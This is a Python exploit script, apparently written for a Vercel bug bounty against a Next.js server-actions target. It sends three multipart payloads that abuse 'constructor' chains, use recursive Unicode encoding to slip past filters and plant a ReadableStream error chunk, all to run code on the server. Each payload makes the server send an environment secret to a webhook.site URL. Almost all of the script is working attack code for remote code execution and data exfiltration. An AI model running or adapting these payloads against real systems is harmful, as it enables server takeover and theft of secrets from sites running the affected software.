#!/usr/bin/env python3
"""
Verified bypass techniques from Vercel's $1M bounty program
Based on Lachlan Davidson and Sylvie's submissions
"""

import requests
import json
import random
import string

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"
WEBHOOK = "https://webhook.site/f794cbb8-6c39-49cc-987a-a141d67c244a"

def unicode_encode_recursive(text, layers=3):
    """Recursively encode text using Unicode escapes"""
    result = text
    for _ in range(layers):
        # Convert to \\uXXXX format
        new_result = ""
        for char in result:
            if ord(char) < 128 and char.isalnum():
                new_result += char
            else:
                new_result += f"\\u{ord(char):04x}"
        result = new_result
    return result

print("="*70)
print("Verified Bypass Techniques")
print("="*70)

# Bypass 1: Recursive UTF Encoding
print("\n[*] Technique 1: Recursive UTF encoding")

# Encode the malicious parts multiple times
code_to_encode = "constructor"
encoded_constructor = unicode_encode_recursive(code_to_encode, layers=2)

payload_code = f"""
require('https').get('{WEBHOOK}?bypass1='+process.env.VERCEL_PLATFORM_PROTECTION)
"""

boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

# Try with encoded constructor
payload_0 = f"$F1#{ACTION_ID}#{encoded_constructor}"
payload_1 = {encoded_constructor: {encoded_constructor: payload_code}}

body = f'------{boundary}\r\n'
body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
body += payload_0 + '\r\n'
body += f'------{boundary}\r\n'
body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
body += json.dumps(payload_1) + '\r\n'
body += f'------{boundary}--\r\n'

headers = {
    'Next-Action': ACTION_ID,
    'Content-Type': f'multipart/form-data; boundary=----{boundary}',
    'Accept': 'text/x-component',
}

r1 = requests.post(TARGET, data=body, headers=headers, timeout=15)
print(f"    Status: {r1.status_code}")
print(f"    Response: {r1.text[:200]}")

# Bypass 2: Constructor access without colon (use bracket notation)
print("\n[*] Technique 2: Constructor without colon (bracket notation)")

boundary2 = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

# Use bracket notation instead of colon
payload2_0 = f"$F1#{ACTION_ID}['constructor']"
payload2_1 = {
    "constructor": {
        "constructor": f"require('https').get('{WEBHOOK}?bypass2='+process.env.VERCEL_PLATFORM_PROTECTION)"
    }
}

body2 = f'------{boundary2}\r\n'
body2 += 'Content-Disposition: form-data; name="0"\r\n\r\n'
body2 += payload2_0 + '\r\n'
body2 += f'------{boundary2}\r\n'
body2 += 'Content-Disposition: form-data; name="1"\r\n\r\n'
body2 += json.dumps(payload2_1) + '\r\n'
body2 += f'------{boundary2}--\r\n'

headers2 = {
    'Next-Action': ACTION_ID,
    'Content-Type': f'multipart/form-data; boundary=----{boundary2}',
    'Accept': 'text/x-component',
}

r2 = requests.post(TARGET, data=body2, headers=headers2, timeout=15)
print(f"    Status: {r2.status_code}")
print(f"    Response: {r2.text[:200]}")

# Bypass 3: ReadableStream error chunk technique
print("\n[*] Technique 3: ReadableStream error chunk")

# Create an errored chunk structure
boundary3 = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

error_chunk_payload = {
    "0": "$E1",  # Error chunk reference
    "1": {
        "message": f"require('https').get('{WEBHOOK}?bypass3='+process.env.VERCEL_PLATFORM_PROTECTION)",
        "stack": "$@2"
    },
    "2": {
        "then": "$1:constructor:constructor"
    }
}

body3 = ''
for key, value in error_chunk_payload.items():
    body3 += f'------{boundary3}\r\n'
    body3 += f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
    if isinstance(value, (dict, list)):
        body3 += json.dumps(value)
    else:
        body3 += value
    body3 += '\r\n'
body3 += f'------{boundary3}--\r\n'

headers3 = {
    'Next-Action': ACTION_ID,
    'Content-Type': f'multipart/form-data; boundary=----{boundary3}',
    'Accept': 'text/x-component',
}

r3 = requests.post(TARGET, data=body3, headers=headers3, timeout=15)
print(f"    Status: {r3.status_code}")
print(f"    Response: {r3.text[:200]}")

print(f"\n[*] Check webhook: {WEBHOOK}")
print("="*70)
